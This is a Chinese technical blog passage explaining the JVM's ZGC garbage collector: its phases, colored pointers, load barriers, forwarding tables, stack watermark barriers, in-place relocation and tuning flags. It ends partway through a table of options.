 <p><img src="https://img-blog.csdnimg.cn/4eae71dfced44545b02e6f3768712ee3.png" alt="ZGC的标记—复制算法"><br> ZGC中的一次垃圾回收过程会被分为十个步骤：初始标记、并发标记、再次标记、并发转移准备：[非强引用并发标记、重置转移集、回收无效页面（区）、选择目标回收页面、初始化转移集（表）]、初始转移、并发转移。但是只有三个阶段需要停顿(STW)：<strong>初始标记，再标记，初始转移</strong>。其中，初始标记和初始转移分别都只需要扫描所有GC Roots，其处理时间和GC Roots的数量成正比，一般情况耗时非常短；再标记阶段STW时间很短，最多1ms，超过1ms则再次进入并发标记阶段。即，ZGC几乎所有暂停都只依赖于GC Roots集合大小，停顿时间不会随着堆的大小或者活跃对象的大小而增加。与ZGC对比，G1的转移阶段完全STW的，且停顿时间随存活对象的大小增加而增加。</p> 
 <ul>
  <li>①初始标记<br> 这个阶段会触发STW，仅标记根可直达的对象，并将其压入到标记栈中，在该阶段中也会发生一些其他动作，如重置 TLAB、判断是否要清除软引用等。</li>
  <li>②并发标记<br> 根据「初始标记」的根对象开启多条GC线程，并发遍历对象图，同时也会统计每个分区/页面中的存活对象数量。</li>
  <li>③再次标记<br> 这个阶段也会出现短暂的STW，因为「并发标记」阶段中应用线程还是在运行的，所以会修改对象的引用导致漏标的情况出现，因此需要再次标记阶段来标记漏标的对象（如果此阶段停顿时间过长，ZGC会再次进入并发标记阶段重新标记）。</li>
  <li>并发转移准备<br> 4~8阶段都是并发转移对象的准备阶段，各子阶段又分别处理了不同事务 
   <ul>
    <li>④非强引用并发标记和引用并发处理<br> 遍历前面过程中的非强引用类型根对象，但并不是所有非强根对象都可并发标记，有部分不能并发标记的非强根对象会在前面的「再次标记」阶段中处理。同时也会标记堆中的非强引用类型对象。</li>
    <li>⑤重置转移集/表<br> 重置上一次GC发生时，转移表中记录的数据，方便本次GC使用。<br> 在ZGC中，因为在回收时需要把一个分区中的存活对象转移进另外一个空闲分区中，而ZGC的转移又是并发执行的，因此，一条用户线程访问堆中的一个对象时，该对象恰巧被转移了，那么这条用户线程根据原本的指针是无法定位对象的，所以在ZGC中引入了转移表<code>forwardingTable</code>的概念。<br> 转移表可以理解为一个<code>Map&lt;OldAddress,NewAddress&gt;</code>结构的集合，当一条线程根据指针访问一个被转移的对象时，如果该对象已经被转移，则会根据转移表的记录去新地址中查找对象，并同时会更新指针的引用。</li>
    <li>⑥回收无效分区/页面<br> 回收物理内存已经被释放的无效的虚拟内存页面。ZGC是一款支持返还堆内存给物理机器的收集器，在机器内存紧张时会释放一些未使用的堆空间，但释放的页面需要在新一轮标记完成之后才能释放，所以在这个阶段其实回收的是上一次GC释放的空间。</li>
    <li>⑦选择待回收的分区/页面<br> ZGC与G1收集器一样，也会<strong>存在「垃圾优先」的特性</strong>，在标记完成后，整个堆中会有很多分区可以回收，ZGC也会<strong>筛选出回收价值最大的页面</strong>来作为本次GC回收的目标。</li>
    <li>⑧初始化待转移集合的转移表<br> 初始化待回收分区/页面的转移表，方便记录区中存活对象的转移信息。<br> 注：每个页面/分区都存在一个转移表<code>forwardingTable</code>。</li>
   </ul> </li>
  <li>⑨初始转移<br> 这个阶段会发生STW，遍历所有GCRoots节点及其直连对象，如果遍历到的对象在回收分区集合内，则在新的分区中为该对象分配对应的空间。不过值得注意的是：该阶段只会转移根对象（也就是GCRoots节点直连对象）。</li>
  <li>⑩并发转移<br> 这个阶段与之前的「并发标记」很相似，从上一步转移的根对象出发，遍历目标区域中的所有对象，做并发转移处理。</li>
 </ul> 
 <h3><a id="ZGC_132"></a>ZGC对象定位</h3> 
 <p>ZGC通过着色指针和读屏障技术，解决了转移过程中准确访问对象的问题，实现了并发转移。大致原理描述如下：并发转移中“并发”意味着GC线程在转移对象的过程中，应用线程也在不停地访问对象。假设对象发生转移，但对象地址未及时更新，那么应用线程可能访问到旧地址，从而造成错误。而在ZGC中，应用线程访问对象将触发“读屏障”，如果发现对象被移动了，那么“读屏障”会把读出来的指针更新到对象的新地址上，这样应用线程始终访问的都是对象的新地址。那么，JVM是如何判断对象被移动过呢？就是利用对象引用的地址，即着色指针。</p> 
 <h4><a id="_Color_Pointer_135"></a>着色指针 <code>Color Pointer</code></h4> 
 <p>已知Java虚拟机垃圾回收时的可达性分析使用了标记-整理类算法。从垃圾回收扫描根集合开始标记存活对象，那么这些标记被储存在哪里？</p> 
 <p>HotSpot虚拟机的标记实现方案有如下几种</p> 
 <ul>
  <li>把标记直接记录在对象头上<br> 如Serial收集器</li>
  <li>把标记记录在与对象相互独立的数据结构上<br> 如G1、Shenandoah使用了一种相当于堆内存的1/64大小的，称为BitMap的结构来记录标记信息</li>
  <li>直接把标记信息记在引用对象的指针上<br> 如ZGC</li>
 </ul> 
 <p><strong>为什么可以把引用关系放在指针上？</strong></p> 
 <p>可达性分析算法的标记阶段就是看有没有引用，所以可以只和指针打交道而不管指针所引用的对象本身。<br> 例如使用三色标记法标记对象是否可达，这些标记本质上只和对象引用有关，和对象本身无关。只有对象的引用关系才能决定它的存活。</p> 
 <p><strong>着色指针</strong>是一种直接将少量额外的信息存储在对象指针上的技术。目前在X64架构的操作系统中高16位是不能用来寻址的。程序只能使用低48位，<br> ZGC将低48位中的高4位取出，用来存储4个标志位。剩余的44位可以支持16TB(2的44次幂)的内存，也即ZGC可以管理的内存不超过16TB。<br> 4个标志位即<strong>着色位</strong>，所以这种指针被称为着色指针。<br> <em><strong>在ZGC中标记信息被直接记在引用对象的着色指针上，这样通过对象着色指针就可以获取 GC 标记，解决转移过程中准确定位对象地址的问题。</strong></em></p> 
 <p>因此，ZGC只能在64位系统上，因为ZGC的<strong>着色指针</strong>使用的是44-48位，32位的x86架构系统显然不支持，并且因为ZGC已经把48位可用的指针地址空间全部使用了，自然也不支持压缩指针。<br> <img src="https://img-blog.csdnimg.cn/78024bccd7194d40aa76b6394d1d28f2.png" alt="着色指针"></p> 
 <blockquote> 
  <p>压缩指针和压缩类指针是两个不同的特性，后者又叫压缩对象头，ZGC是支持压缩对象头这一特性的，在JDK15后提供。</p> 
 </blockquote> 
 <p><img src="https://img-blog.csdnimg.cn/img_convert/89112b34a4cff3d0a3350441d17455ef.png#pic_center" alt="着色位"><br> ZGC的四个着色位可以记录四种垃圾回收标记状态，即<code>marked0、marked1、remapped、Finalizable</code>,好像给指针染上了四种不同的颜色，所以叫做着色指针。</p> 
 <blockquote> 
  <ul>
   <li>指针如何实现染色<br> 指针的原本的作用在于寻址，如果我们想实现染色指针，就得把43~46位赋予特殊含义，这样寻址就不对了。所以最简单的方式是寻址之前把指针进行裁剪，只使用低44位去寻址（最大16TB内存）这样做导致的问题是，需要将裁剪指针寻址地址的 CPU 指令添加到生成的代码中，会导致应用程序变慢。<br> 为了解决上面指针裁剪的问题，ZGC 使用了<code>mmap</code>内核函数进行多虚拟地址内存映射。使用 mmap 可以将同一块物理内存映射到多个虚拟地址上。这样，就可以实现堆中的一个对象，有4个虚拟地址，不同的地址标记不同的状态 marked0、marked1、remapped，Finalizable。且都可以访问到内存。这样实现了指针染色的目的，且不用对指针进行裁剪，提高了效率。</li>
  </ul> 
 </blockquote> 
 <p>着色指针的四个着色状态</p> 
 <ul>
  <li>Finalizable=1000 <strong>终结状态</strong><br> 表示对象已经要被回收了，此位与并发引用处理有关，表示这个对象只能通过finalizer才能访问。</li>
  <li>Remapped=0100 <strong>未扫描状态</strong><br> 设置此位的值后，表示这个对象未指向RelocationSet中（relocation set表示需要GC的Region分区/页面集合）。</li>
  <li>Marked1=0010 <strong>已标记状态</strong><br> 对象已标记状态，用于辅助GC。</li>
  <li>Marked0=0001 <strong>已标记状态</strong><br> 对象已标记状态，用于辅助GC。</li>
 </ul> 
 <blockquote> 
  <p>为什么会有两个Marked标识<br> 这是为了防止不同GC周期之间的标记混淆，所以搞了两个Marked标识，每当新的一次GC开始时，都会交换使用的标记位。例如：第一次GC使用M0，第二次GC就会使用M1，第三次又会使用M0…，因为ZGC标记完所有分区的存活对象后，会选择分区进行回收，因此有一部分区域内的存活对象不会被转移，那么这些对象的标识就不会复位，会停留在之前的Marked标识（比如M0），如果下次GC还是使用相同M0来标记对象，那混淆了这两种对象。为了确保标记不会混淆，所以搞了两个Marked标识交替使用。</p> 
 </blockquote> 
 <h4><a id="_View_181"></a>内存视图 <code>View</code></h4> 
 <p>内存视图是指ZGC对Java对象状态的一种描述，<strong>通过内存视图和着色指针配合，ZGC得以完成在并发转移对象的同时准确定位对象地址</strong>。<br> ZGC将所有对象划分为 3 种不同的视图（状态）：<code>marked0、marked1、remapped</code>，同一时刻只能处于其中一种视图（状态）。比如：</p> 
 <ul>
  <li> <p>在没有进行垃圾回收时，视图为<code>remapped</code> 。</p> </li>
  <li> <p>在 GC 进行标记开始，将视图从 <code>remapped </code>切换到<code>marked0/marked1 </code>。</p> </li>
  <li> <p>在 GC 进行转移阶段，又将视图从<code>marked0/marked1 </code>切换到<code>remapped</code>。</p> </li>
  <li> <p>“好”指针和“坏”指针<br> 任意线程当前访问对象的指针的着色状态和当前所处的视图<strong>一致</strong>时，则当前指针为** “好”指针** ；当前指访问对象的指针的状态和当前所处的视图<strong>不一致</strong>时，则为**“坏”指针**。<br> 线程访问到好指针无需处理，直接通过指针访问对象地址。</p> </li>
  <li> <p>触发读屏障<br> 线程访问到坏指针时，在不同阶段会有不同的处理，处理过程在读屏障中实现。</p> 
   <ul>
    <li>标记阶段<br> 访问到坏指针时，说明此对象存活且未被标记，会将指针着色状态调整为已标记的M0/M1状态。</li>
    <li>转移阶段<br> 访问到坏指针时，说明此对象需要被移动。线程会转移对象，然后将指针着色状态调整为未标记的Remapped状态，等待下轮GC扫描。不仅是GC线程，应用线程访问到坏指针时也会转移对象，这称为应用线程的协作转移。这样做让对象转移成为并发的过程，无需等待GC线程转移对象，应用线程自己就可以完成转移。</li>
   </ul> </li>
  <li> <p>着色指针的**“自愈”**<br> 通过上面的说明，发现线程访问到坏指针，在触发读屏障处理后，又恢复成好指针，且直到下轮GC之间无需再处理，线程可以直接访问对象。这一特性被称之为，ZGC的指针拥有“自愈”能力。</p> </li>
 </ul> 
 <h4><a id="_Load_Barrier_202"></a>读屏障 <code>Load Barrier</code></h4> 
 <p>读屏障是一小段在特殊位置由 JIT 注入的代码，类似我们 JAVA 中常用的 AOP 技术；主要目的是处理GC并发转移后地址定位问题，对象漏标问题。</p> 
 <pre><code class="prism language-c">Object o <span class="token operator">=</span> obj<span class="token punctuation">.</span>fieldA<span class="token punctuation">;</span> <span class="token comment">// 只有从堆中获取一个对象时，才会触发读屏障</span>
<p><span class="token comment">// 读屏障伪代码</span><br>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>o <span class="token operator">&amp;</span> good_bit_mask<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;<!-- --></span><br>
<span class="token keyword">if</span> <span class="token punctuation">(</span>o <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">&#123;<!-- --></span><br>
<span class="token comment">// 处理并注册地址</span><br>
<span class="token function">slow_path</span><span class="token punctuation">(</span><span class="token function">register_for</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">address_of</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>fieldA<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span><br>
<span class="token punctuation">&#125;</span><br>
</code></pre></p>
 <ul>
  <li> <p>处理对象漏标问题<br> 读屏障是在读取成员变量时，统统记录下来，这种做法是保守的，但也是安全的。根据三色标记法，引发漏标问题必须要满足两个条件，其中条件二为：「已经标为黑色的对象重新与白色对象建立了引用关系」，也就是已经标记过的存活对象（黑色对象）重新和垃圾对象（白色对象）建立了引用关系，而黑色对象想要与白色对象重新建立引用的前提是：得先读取到白色对象，此时读屏障的作用就出来了，可以直接记录谁读取了当前白色对象，然后在「再次标记」重新标记一下这些黑色对象即可。</p> </li>
  <li> <p>处理并发转移时对象地址定位问题<br> GC发生后，堆中一部分存活对象被转移，当应用线程读取对象时，可以利用读屏障通过指针上的标志来判断对象是否被转移，如果读取的对象已经被转移（线程读取到<em>坏指针</em>），那么则修正当前对象引用为最新地址（去转移表中查）。这样做的好处在于：下次其他线程再读取该转移对象时，可以正常访问读取到最新值（着色指针的<em>自愈</em>）。</p> </li>
 </ul> 
 <h4><a id="_Forwarding_Table_222"></a>转移表 <code>Forwarding Table</code></h4> 
 <p>转移表<code>ForwardingTable</code>是ZGC确保转移对象后，其他引用指针能够指向最新地址的一种技术，每个页面/分区(<code>ZPage</code>)中都会存在，其实就是该区中所有存活对象的转移记录，也称之为「活跃信息表」。一条线程通过引用来读取对象时，发现对象被转移后就会去转移表中查询最新的地址，并更新地址。这样在并发场景下，用户线程使用读屏障就可以通过转发表拿到新地址，用户线程可以准确访问并发转移阶段的对象了。<br> 转移表中的数据会在发生下一次GC时清空重置，也包括会在下一次GC时触发着色指针的重映射/重定位操作。在下一次GC并发标记阶段会遍历转发表，完成所有的地址转发过程，最后在并发转移准备阶段会清空转发表。<br> <img src="https://img-blog.csdnimg.cn/456fde95f6e04c63baaebded29f7f39b.png" alt="转移表"></p> 
 <h4><a id="_227"></a>并发标记过程</h4> 
 <p>ZGC基于染色指针的并发处理过程：</p> 
 <ul>
  <li>在第一次GC发生前，堆中所有对象的标识为：Remapped 初始状态。</li>
  <li>第一次GC被触发后，此时内存视图已经为开始GC的M0状态。GC线程开始标记，开始扫描，如果对象是Remapped标志，并且该对象根节点可达的，则将其改为M0标识，表示存活对象且已被标记。</li>
  <li>如果标记过程中，扫描到的对象标识已经为M0，代表该对象已经被标记过，或者是GC开始后新分配的对象，这种情况下无需处理。</li>
  <li>在GC开始后，用户线程新创建的对象，会直接标识为和内存视图一致的M0状态。</li>
  <li>在标记阶段，GC线程仅标记用户线程可直接访问的对象还是不够的，实际上还需要把对象的成员变量所引用的对象都进行递归标记。</li>
 </ul> 
 <p>在「标记阶段」结束后，对象要么是M0存活状态，要么是未被标记的Remapped初始状态，说明这些对象不可达，即待回收状态。最终，所有被标记为M0状态的活跃对象都会被放入「活跃信息表」中。等到了「转移阶段」再对这些对象进行处理，流程如下：</p> 
 <ul>
  <li>ZGC选择目标回收区域，开始并发转移，此时内存视图切换为Remapped状态。</li>
  <li>GC线程遍历访问目标区域中的对象，如果对象标识为M0并且存在于活跃表中，则把该对象转移到新的分区/页面空间中，同时将其标识修正为Remapped标志。</li>
  <li>GC线程如果扫描到的对象存在于活跃表中，但标识为Remapped，说明该对象已经转移过了，无需处理。</li>
  <li>用户线程在「转移阶段」新创建的对象，会被标识为和内存视图一致的Remapped状态。</li>
  <li>如果GC线程遍历到的对象不是M0状态或不在活跃表中，说明不可达，也无需转移处理。<br> 最终，当目标区域中的所有存活对象被转移到新的分区后，ZGC统一回收原本的选择的回收区域。至此，一轮GC结束，整个堆空间会正常执行应用任务，直至触发下一轮GC。而当下一轮GC发生时，会采用M1作为GC辅助标识，而并非M0，具体原因在前面分析过了则不再阐述。</li>
 </ul> 
 <h3><a id="_Stack_Watermark_Barrier_243"></a>栈水印屏障 <code>Stack Watermark Barrier</code></h3> 
 <p>JDK16后通过JEP 376提案合入JDK主线，ZGC的又一强大特性。有了这一特性的支持，从JDK 16开始。ZGC现在的暂停时间为O(1)。换句话说，它们是在恒定的时间内执行的，并且不会随着堆、活动对象集或GC Roots根集大小（或其他任何东西）的增加而增加。通过栈水印屏障特性的支持，ZGC实现了常数级暂停，亚毫秒级暂停的能力。</p> 
 <p>栈水印屏障是什么？先看一下官方博客对此的说明</p> 
 <blockquote> 
  <p>在JDK 16之前，ZGC的暂停时间仍然随GC Roots根集的大小（子集）而缩放。更准确地说，ZGC仍然在停止世界阶段扫描线程栈。这意味着，如果一个Java应用有大量的线程，那么暂停时间会增加。如果这些线程有很深的调用栈，那么暂停时间会增加得更多。从JDK 16开始，线程栈的扫描是并发进行的，即在Java应用程序继续运行的同时进行。<br> 栈水印屏障机制，可以防止Java线程在没有首先检查是否可以安全返回的情况下返回到栈帧。可以把它看作是栈帧的读屏障，如果需要的话，它将迫使Java线程在返回到栈帧之前采取某种形式的动作，使栈帧进入安全状态。每个 Java 线程都有一个或多个栈水印屏障，它告诉屏障在没有任何特殊操作的情况下可以在栈中安全地走多远。要走过一个水印，就要走一条慢路，使一个或多个栈帧进入当前安全状态，并更新水印。将所有线程栈带入安全状态的工作通常由一个或多个GC线程处理，但由于这是并发完成的，如果Java线程返回到GC线程尚未到达的栈帧中，有时就必须修复自己的几个栈帧。<br> 有了JEP 376，ZGC现在在Stop-The-World阶段扫描的根数正好为零。</p> 
 </blockquote> 
 <p>虽然说的有些绕，但还是说明了问题和解决方案。</p> 
 <p>问题就是，在JDK 16之前，<strong>ZGC的暂停时间仍然随GC Roots根集的大小增大而增大</strong>，因为ZGC要在程序完全停顿时，去扫描每个线程的所有栈帧中的回收根GCRoots。因为线程一旦运行，回收根很可能就会变化么，这很好理解。在上面的 【ZGC的标记—复制算法】，这一节里看到在<em>初始标记阶段</em>，应用程序是完全暂停的。<br> 所以随着线程增多等原因，GC Roots根集增大，那自然停顿时间也要增加了呗。解决这个问题的方法，当然是和其他阶段一样，尽量使初始标记阶段对GC根集的扫描也和并发标记阶段一样，可以并发的去标记。</p> 
 <p>ZGC对这个问题怎么处理的？读屏障，没错还是读屏障，这次是对于线程栈帧使用的读屏障。</p> 
 <p>简答来说，就是通过<em><strong>栈水印屏障</strong></em>这一机制，用户线程不会在GC线程正在扫描一个线程栈时，进入这个栈。栈水印屏障的读屏障机制，会确保GC线程正在扫描线程的一个栈帧时，用户线程不会进入到这个栈帧里，直到GC线程标记完成。<strong>这一过程是完全并发的，GC线程在运行时栈的栈顶下方的栈帧里标记，用户线程在运行时栈的栈顶继续执行，栈顶的栈帧由用户线程负责标记。</strong> 这样就可以做到在标记线程栈中的GC根集同时，用户线程并发运行，无需“停止世界”。</p> 
 <p>下面具体研讨下栈水印屏障的组成和原理</p> 
 <ul>
  <li> <p>栈水印是什么？<br> 上面说到了GC线程需要在用户线程运行时并发的去标记GC根节点，那么用户线程运行时很可能因为方法执行完毕，分支结束等原因弹出当前栈帧，回到上一个栈帧，此时GC根对象的引用关系就可能发生变化。那么问题就是如何检测这种变化？很容易想到就是退回栈时由用户线程去检测变化，重新标记GC根节点（也就是用户线程的一种协作式的标记，和用户线程遇到“坏指针”帮助转移对象一样）那么退回栈后应该扫描多少个栈帧？扫描少了，可能漏标，扫描多了会影响性能。为了降低业务线程扫描栈帧的工作量，HotSpot虚拟机中采用<strong>栈水印</strong>这一机制。<br> 栈水印是一种在运行时栈上的标记，假设线程运行时栈向下增长，发生回栈时，可以区分回到的栈帧是否高于栈水印标记，高于水印标记的栈帧已经被标记完毕，而低于水印标记的栈帧为正在运行的用户线程栈帧。如果回到的栈已经高于栈水印，则此栈不能由 Java 线程直接使用，因为它可能因为引用关系变化而包含过时的对象引用。</p> </li>
  <li> <p>读屏障<br> 栈水印所依赖的一种读屏障。为了降低业务线程扫描栈帧的工作量，HotSpot 中采用单个栈帧扫描的方式，即在回栈时如果超过当前<strong>栈水印标记</strong>，就会进入栈水印屏障，在这个读屏障中会执行一系列操作，去处理当前帧到栈水印标记之前的栈帧，其中因为回栈可能导致引用关系变化的内容。包括修复调用方的对象指针，重新标记此节点的GC根集等。<br> 如果此时GC线程正在标记要回栈的帧，则读屏障会限制用户线程在GC线程标记完成之前不能返回此帧。</p> </li>
  <li> <p>完全并发标记过程</p> 
   <ul>
    <li>完全并发标记GC根集时，GC线程在运行时栈的栈顶下方的栈帧里标记，用户线程在运行时栈的栈顶继续执行。线程通过GC安全点时，将通过改变全局变量的方式在逻辑上使 Java 线程栈失效(判定为非用户线程当前帧)。每个无效的栈将被GC线程同时处理，并且继续跟踪剩余的待处理内容直到完成。</li>
    <li>在应用线程回栈时，操作栈钩子会将一些堆栈本地地址与水印进行比较，如果回栈到栈水印之上，则需要去修复栈帧，并且向上移动水印。每次处理过程都包含对此栈帧的调用方和被调用方的处理，所以处理一般发生在栈顶的两帧上。栈水印屏障则在这两帧的后面，而且在用户线程回栈时，栈水印屏障会检查GC线程是否在处理，GC线程在处理后续的帧时，用户线程不能回栈到此帧。</li>
    <li>Java 线程将处理继续执行所需的最小帧数。并发 GC 线程将处理剩余的帧，确保最终扫描完所有线程栈和其他线程GC根集。</li>
   </ul> </li>
 </ul> 
 <p>栈水印屏障 <code>Stack Watermark Barrier</code>的实现非常复杂，即便是ZGC官方博客也没有对其的详细讲解，有兴趣的可以具体去查看源码。</p> 
 <h2><a id="ZGC__275"></a>ZGC 其他特性</h2> 
 <h3><a id="_276"></a>支持非统一内存访问架构</h3> 
 <blockquote> 
  <p>UMA架构：UMA即Uniform Memory Access Architecture（统一内存访问），UMA也就是一般正常电脑的常用架构，一块内存多颗CPU，所有CPU在处理时都去访问一块内存，所以必然就会出现竞争（争夺内存主线访问权），而操作系统为了避免竞争过程中出现安全性问题，注定着也会伴随锁概念存在，有锁在的场景定然就会影响效率。同时CPU访问内存都需要通过总线和北桥，因此当CPU核数越来越多时，渐渐的总线和北桥就成为瓶颈，从而导致使用UMA/SMP架构机器CPU核数越多，竞争会越大，性能会越低。</p> 
 </blockquote> 
 <blockquote> 
  <p>NUMA架构：NUMA即Non Uniform Memory Access Architecture（非统一内存访问），NUMA架构下，每颗CPU都会对应有一块内存，具体内存取决于处理器的内存位置，一般与CPU对应的内存都是在主板上离该CPU最近的，CPU会优先访问这块内存，每颗CPU各自访问距离自己最近的内存，效率自然而然就提高了。<br> NUMA架构允许多台机器共同组成一个服务供给外部使用，NUMA技术可以使众多服务器像单一系统那样运转，该架构在中大型系统上一直非常盛行，也是高性能的解决方案，尤其在系统延迟方面表现都很优秀，因此，实际上堆空间也可以由多台机器的内存组成。</p> 
 </blockquote> 
 <p>通过NUMA非统一内存访问架构，机器得以纵向扩展，硬件性能堆叠，提供TB级内存单元。<br> ZGC是能自动感知处理器是否是NUMA架构，并可以充分利用NUMA架构特性的一款垃圾收集器。<br> ZGC在NUMA架构的处理器上,为活跃线程分配对象时，会就近分配到此线程所在处理器的优先访问内存上。</p> 
 <h3><a id="_288"></a>就地重定位</h3> 
 <p>ZGC使用的是标记—整理算法，也就是优化的标记-复制算法。此算法有个缺陷，就是要复制或者说移动对象，那么内存中必须存在一定的连续空闲空间用于移动对象，如果堆已满，即所有堆区域都已在使用中，那么我们无处可移动对象。<br> 在 JDK 16 之前，ZGC 通过保留堆解决了这个问题。此保留堆是一组被搁置的堆区域，并且对于来自用户线程的正常分配内存不可用。一般保留堆占整个Java堆的15%左右。使用保留堆的方案仍然存在一些缺陷，首先就是堆内存的浪费，其次是保留堆不一定能完全支持整理过程完成，此时可能导致ZGC失败，发生长时间暂停或堆栈溢出异常。<br> 其他收集器，比如G1，可以通过<strong>就地压缩堆</strong>来处理整理算法的需要空闲空间的问题，这种方法的主要优点是它不需要空闲内存来保证整理堆空间以释放内存。换句话说，它将压缩一个完整的堆，而不需要某种堆空间保留。<br> ZGC中将类似的能力称之为<strong>就地重定位<code>In-Place Relocation</code></strong></p> 
 <ul>
  <li>就地重定位<br> <img src="https://img-blog.csdnimg.cn/d3e4f7751ace4bfeb1f395800447cfa2.png#pic_center" alt="就地重定位"><br> 无连续空闲空间，就地重定位，活动对象按顺序移动的空间0</li>
  <li>非就地重定位<br> <img src="https://img-blog.csdnimg.cn/01109030e518436380af789e0d49ba59.png#pic_center" alt="无需就地重定位"><br> 有连续空闲空间 3，无需就地重定位，按整理算法直接移动活动对象到3号空间</li>
 </ul> 
 <p>但是，就地重定位通常会带来更多的性能开销。例如，就地重定位必须顺序的移动对象，否则可能会覆盖尚未移动的对象。此时GC 线程不能进行并行处理移动对象，并且还会影响 Java 线程操作需要GC整理的对象，在这些对象重新定位时会产生一些操作限制。<br> 当有空闲堆区域可用时，不就地重新定位通常性能更好， 而就地重定位可以保证重新定位过程成功完成，即使没有空堆区域可用。总之，这两种方法都有优点。<br> 从 JDK 16 开始，ZGC 现在同时的使用这两种方法来实现两全其美的效果。这使得即便不使用保留堆 ，仍然可以在普通情况下保持良好的转移对象的性能，并保证即便在无空闲空间的危险情况下，仍然可以实现对象整理。<br> <strong>默认情况下，只要存在可用于将对象移动到的空闲堆区域，ZGC 就不会就地重新定位。否则，ZGC将启用就地重定位。一旦重新有空闲堆区域可用，ZGC将再次切换回不使用地重新定位。</strong></p> 
 <h2><a id="Azul_Zing_C4_GC_305"></a>对比Azul Zing C4 GC</h2> 
 <p>C4收集器由Azul的无暂停垃圾收集器PauseLessGC发展而来，相比PauseLess收集器，C4收集器最大的改进就是支持了分代回收模型。<br> 这有点像ZGC的发展历程，目前(截止JDK18)的ZGC都是不支持分代的，而支持分代的ZGC正在开发中。<br> 有观点认为ZGC就是重写的，纯软件实现的Azul PauseLessGC。目前正在追逐接近C4GC的目标。</p> 
 <p>C4全名 Continuously Concurrent Compacting Collector，连续并发压缩回收器。</p> 
 <p>ZGC的完全并发能力，对应C4的 Continuously Concurrent 连续并发能力<br> ZGC的标记—整理算法，就地重定位能力，对应C4的 Compacting 压缩能力<br> 现在也就差分代回收未实现了。<br> 没有分代回收，ZGC在极高对象分配速率时，仍然不及C4GC。</p> 
 <h2><a id="_316"></a>总结</h2> 
 <h3><a id="ZGC__317"></a>ZGC 优点</h3> 
 <ul>
  <li>低停顿，高吞吐量，ZGC收集过程中额外耗费的内存小。 
   <ul>
    <li>低停顿，几乎所有过程都是并发的，只有短暂的STW。</li>
    <li>占用额外的内存小。G1通过写屏障维护记忆集，才能处理跨代指针，得以实现增量回收。记忆集占用大量内存，写屏障对正常程序造成额外负担。而ZGC没有写屏障，卡表之类的。（但这主要得益于ZGC目前没有实现分代回收，要是分代回收实现之后，还会不会这样不好说了）</li>
    <li>吞吐量方面，在ZGC的‘弱项’吞吐量方面，因为和用户线程并发，还是有影响的。但是以低延迟为首要目标的ZGC已经达到了以高吞吐量为目标Parallel Scavenge收集器的99%,直接<strong>超越了G1</strong>。</li>
   </ul> </li>
  <li>支持NUMA架构<br> 现在多CPU插槽的服务器都是NUMA架构，比如两颗CPU插槽(24核)，64G内存的服务器，那其中一颗CPU上的12个核，访问从属于它的32G本地内存，要比访问另外32G远端内存要快得多。<br> 在支持NUMA架构的多核处理器下，ZGC优先在线程当前所处的处理器的本地内存上分配对象，以保证内存高效访问。</li>
  <li>ZGC采用并发的标记-整理算法。没有内存碎片。</li>
 </ul> 
 <h3><a id="ZGC__326"></a>ZGC 缺点</h3> 
 <ul>
  <li>承受的对象分配速率不会太高，因为浮动垃圾。<br> ZGC的停顿时间是在10ms以下，但是ZGC的执行时间还是远远大于这个时间的。<br> 假如ZGC全过程需要执行10分钟，在这个期间由于对象分配速率很高，将创建大量的新对象，这些对象很难进入当次GC，会被直接判定为存活对象，而本轮GC回收期间可能新分配的对象会有大部分对象都成为了“垃圾”，这些只能等到下次GC才能回收的对象就是<strong>浮动垃圾</strong>。可能造成回收到的内存空间小于期间并发产生的浮动垃圾所占的空间。<br> 这个问题通过分代回收能有很大优化，但是目前ZGC还不支持分代。</li>
  <li>ZGC目前不支持分代回收<br> ZGC目前没有实现分代回收，每次都需要进行全堆扫描，导致一些“朝生夕死”的对象没能及时的被回收。所以就不存在Young GC、Old GC，所有的GC行为都是Full GC。</li>
  <li>ZGC在OpenJDK上只有在JDK17以后才正式可用<br> Oracle HotSpotJDK,Adopt OpenJDK等常用JDK在低版本均无生产可用的ZGC，虽然OpenJDK中的ZGC在Java15中正式生产可用，但是Java17才是Java11之后的下一个长期稳定版。可以通过选择AliJDK，TencentJDK等试用规避此问题。</li>
 </ul> 
 <h2><a id="ZGC_336"></a>ZGC使用</h2> 
 <h3><a id="_337"></a>低版本可用</h3> 
 <p>ZGC在Java15正式生产就绪，而下一个长期支持版的Java为Java 17。这对于一些还在使用低版本JDK的开发者来说是个难题，毕竟升级JDK并不是一蹴而就的容易事。<br> 那么有没有办法在Java11即可使用ZGC呢？也有的</p> 
 <p>国内的话，阿里云开源并维护的<code>Ali DragonWell JDK</code>，腾讯开源并维护的 <code>Tencent Kona JDK</code>,均提供了Java11版本下可用的ZGC。并且移植了大量高版本OpenJDK的特性和ZGC问题的修复，如果要在Java11下使用ZGC，选择以上两家的JDK是最后的选择。</p> 
 <p>并不建议在Java11版本的OpenJDK上使用ZGC，因为存在很多在高版本才修复的问题。</p> 
 <h3><a id="ZGC_344"></a>ZGC参数说明</h3> 
 <p>Java 17下启用ZGC指令</p> 
 <pre><code class="prism language-xml">-XX:+UseZGC 
</code></pre> 
 <p>注意不需要使用G1收集器时的关闭CMS收集器指令,因为CMS收集器已经在Java 9中被删除了。</p> 
 <table>
  <thead>
   <tr>
    <th>通用GC选项</th>
    <th>ZGC选项</th>
    <th>ZGC诊断选项</th>
   </tr>
  </thead>
  <tbody>
   <tr>
    <td>-XX:MinHeapSize, -Xms</td>
    <td>-XX:ZAllocationSpikeTolerance</td>
    <td>-XX:ZStatisticsInterval</td>
   </tr>
   <tr>
    <td>-XX:InitialHeapSize, -Xms</td>
    <td>-XX:ZCollectionInterval</td>
    <td>-XX:ZVerifyForwarding</td>
   </tr>
   <tr>
    <td>-XX:MaxHeapSize, -Xmx</td>
    <td>-XX:ZFragmentationLimit</td>
    <td>-XX:ZVerifyMarking</td>
   </tr>
   <tr>
    <td>-XX:SoftMaxHeapSize</td>
    <td>-XX:ZMarkStackSpaceLimit</td>
    <td>-XX:ZVerifyObjects</td>
   </tr>
   <tr>
    <td>-XX:ConcGCThreads</td>
    <td>-XX:ZProactive</td>
    <td>-XX:ZVerifyRoots</td>
   </tr>
   <tr>
